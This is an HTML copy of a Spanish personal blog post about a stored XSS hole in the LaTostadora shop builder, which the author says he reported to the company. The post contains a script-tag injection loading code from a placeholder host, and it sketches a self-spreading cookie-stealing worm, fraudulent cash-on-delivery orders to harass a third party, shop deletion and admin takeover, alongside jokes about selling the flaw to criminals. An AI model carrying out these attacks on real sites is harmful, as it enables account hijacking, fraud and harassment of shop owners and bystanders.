@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  <title>Jose-Linares.com</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="title: Usando la magia del XSS en LaTostadora para ataques imaginativoslink: http://jose-linares.com/usando-la-magia-del-xss-en-latostadora-para-ataques-imaginativos/author: koji3description:post_id:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jose-Linares.com">
+<meta property="og:url" content="http://jose-linares.com/04/01/2017/20161130-usando-la-magia-del-xss-en-latostadora-para-ataques-imaginativos/index.html">
+<meta property="og:site_name" content="Jose-Linares.com">
+<meta property="og:description" content="title: Usando la magia del XSS en LaTostadora para ataques imaginativoslink: http://jose-linares.com/usando-la-magia-del-xss-en-latostadora-para-ataques-imaginativos/author: koji3description:post_id:">
+<meta property="og:image" content="http://jose-linares.com/wp-content/uploads/2016/11/Screenshot-from-2016-11-30-10-07-17.png">
+<meta property="og:image" content="http://jose-linares.com/wp-content/uploads/2016/11/Screenshot-from-2016-11-30-10-12-44.png">
+<meta property="og:updated_time" content="2017-01-04T10:54:02.542Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Jose-Linares.com">
+<meta name="twitter:description" content="title: Usando la magia del XSS en LaTostadora para ataques imaginativoslink: http://jose-linares.com/usando-la-magia-del-xss-en-latostadora-para-ataques-imaginativos/author: koji3description:post_id:">
+<meta name="twitter:image" content="http://jose-linares.com/wp-content/uploads/2016/11/Screenshot-from-2016-11-30-10-07-17.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Jose-Linares.com" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/typing.css">
+</head>
+
+  
+    <body>
+  
+      <div id="container" class="container">
+        <article id="post-20161130-usando-la-magia-del-xss-en-latostadora-para-ataques-imaginativos" class="article article-type-post" itemscope itemprop="blogPost">
+  <header id="header" class="header">
+  <nav id="main-nav" class="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+    
+  </nav>
+</header>
+
+  <hr/>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry typo" itemprop="articleBody">
+      
+        <p>title: Usando la magia del XSS en LaTostadora para ataques imaginativos<br>link: <a href="http://jose-linares.com/usando-la-magia-del-xss-en-latostadora-para-ataques-imaginativos/">http://jose-linares.com/usando-la-magia-del-xss-en-latostadora-para-ataques-imaginativos/</a><br>author: koji3<br>description:<br>post_id: 1072<br>created: 2016/11/30 10:03:35<br>created_gmt: 2016/11/30 10:03:35<br>comment_status: open<br>post_name: usando-la-magia-del-xss-en-latostadora-para-ataques-imaginativos<br>status: publish<br>post_type: post</p>
+<h1 id="Usando-la-magia-del-XSS-en-LaTostadora-para-ataques-imaginativos"><a href="#Usando-la-magia-del-XSS-en-LaTostadora-para-ataques-imaginativos" class="headerlink" title="Usando la magia del XSS en LaTostadora para ataques imaginativos"></a>Usando la magia del XSS en LaTostadora para ataques imaginativos</h1><p>Hace ya bastantes años que conozco LaTostadora, una web de venta de camisetas y otras prendas que te permite personalizar los productos a tu gusto y montar tu propia tienda para vender por internet con el método de Dropshipping. El caso es que hace unos días me dio la corazonada de que la web no era todo lo segura que debería, y estaba en lo cierto. El servicio te permite cambiar alguna información de tu tienda para darle un toque personal: título, imagen de cabecera, la descripción,… Total, que esto huele a XSS desde lejos, probemos a ver si es verdad: <img src="/wp-content/uploads/2016/11/Screenshot-from-2016-11-30-10-07-17.png" alt="screenshot-from-2016-11-30-10-07-17">   Luego visitamos la web y… <img src="http://jose-linares.com/wp-content/uploads/2016/11/Screenshot-from-2016-11-30-10-12-44.png" alt="screenshot-from-2016-11-30-10-12-44"> It works! :D Como véis no solo se pueden insertar scripts javascript, sino que además se pueden leer las cookies del usuario desde esos mismos scripts (no son cookies HttpOnly). Vale, ahora viene la parte imaginativa del asunto: como aprovechar esto para hacer el máximo ruido. A mi por lo pronto se me ocurren algunas cosillas: </p>
+<ol>
+<li>Fabricar un script que use la cookie capturada para hacer una petición en nombre de ese usuario a la página <a href="https://www.latostadora.com/configuracion_basica.php" target="_blank" rel="external">https://www.latostadora.com/configuracion_basica.php</a> y autoinsertarse en las descripciones de todas sus tiendas. Luego cambio la descripción de mi tienda por: <script src="url.com/js.js" type="text/javascript"></script>. De esta manera, el script se multiplicará por todas las tiendas en pocos dias. Una vez que un gran número de tiendas tiene ese script, cambiarlo (porque recordemos que yo tengo acceso a la url donde se aloja) para que pida 10 camisetas contrarembolso con destino a la casa de alguien que te caiga mal. Resultado? miles de camisetas sin pagar llegando a casa de algún capullo.</li>
+<li>También se podría solicitar la eliminación de todas las tiendas junto con todos los diseños que tenga subidos el usuario. Si solo queda en pie mi tienda supongo que los beneficios subirán, no?</li>
+<li>Esperar a que alguno de los admin visite mi web y hacerme con el control de su negocio</li>
+<li>El único límite es tu imaginación.</li>
+<li>Avisar a los responsables para que lo arrelgen. Admito que es la que menos ilusión me hace, pero puede que me recompensen el hecho de avisarles a ellos antes que a la mafia rusa.<br>Así que finalmente he optado por esta última, les he escrito un correo para ver a que recompensa podría optar y me han dicho que como mucho aspiro a una camiseta gratis para mi. No es que me parezca poco, pero por si acaso voy a ver si la mafia rusa mejora la oferta antes de aceptar un regalo de 10€ a cambio de una información que te puede ahorrar mas de un quebradero de cabeza. PD: también son vulnerables los campos de título de la tienda, y los titulos de las camisetas.</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <ul class="article-meta">
+        <li>
+          <span class="label">Published Date:</span>
+          <a href="/04/01/2017/20161130-usando-la-magia-del-xss-en-latostadora-para-ataques-imaginativos/" class="article-date">
+  <time datetime="2017-01-04T22:11:59.631Z" itemprop="datePublished">04/01/2017</time>
+</a>
+
+        </li>
+        
+        
+        <hr/>
+      </ul>
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav" class="article-nav">
+  
+    <span id="article-nav-newer" class="article-nav-link-wrap newer"></span>
+  
+  
+    <a href="/04/01/2017/20160601-tip-actualizar-el-historial-de-bash-justo-despues-de-ejecutar-un-comando/" id="article-nav-older" class="article-nav-link-wrap older">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+
+
+
+      </div>
+      
+    <footer id="footer" class="post-footer footer">
+      <hr/>
+      <div id="footerContent" class="footer-content">
+        <p>2017 @ Any Rights Reserved</p>
+
+
+      </div>
+    </footer>
+
+      
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/typing.js"></script>
+<!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+
+
+
+
+
+
+
+    </div>
+  </body>
+</html>
